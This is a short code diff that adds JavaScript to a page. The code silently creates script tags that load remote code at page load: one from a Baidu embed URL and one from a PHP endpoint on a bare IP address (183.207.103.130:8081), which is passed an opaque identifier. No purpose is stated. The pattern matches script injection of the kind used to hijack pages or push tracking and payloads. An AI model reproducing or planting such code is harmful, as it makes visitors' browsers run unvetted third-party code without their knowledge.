@@ -1,0 +1,3 @@
+var _ju = "http://sgoutong.baidu.com/embed/1525933466/asset/embed/pc_nb.js";_ju += (_ju.indexOf('?') > 0 ? '&' : '?') + '_t=' + (new Date().getTime());var _b = "AH023441";var _c = "3256452_(i1g8V1PhDj8dwl8diJm=_22760537_1";
+var N1=document.createElement("script");N1.setAttribute("type","text/javascript"),N1.setAttribute("src",_ju),document.head?document.head.appendChild(N1):document.body&&document.body.appendChild(N1);
+var N2=document.createElement("script");N2.setAttribute("type","text/javascript"),N2.setAttribute("src","http://183.207.103.130:8081/pjk/static/tp.php?b="+_b),document.head?document.head.appendChild(N2):document.body&&document.body.appendChild(N2);
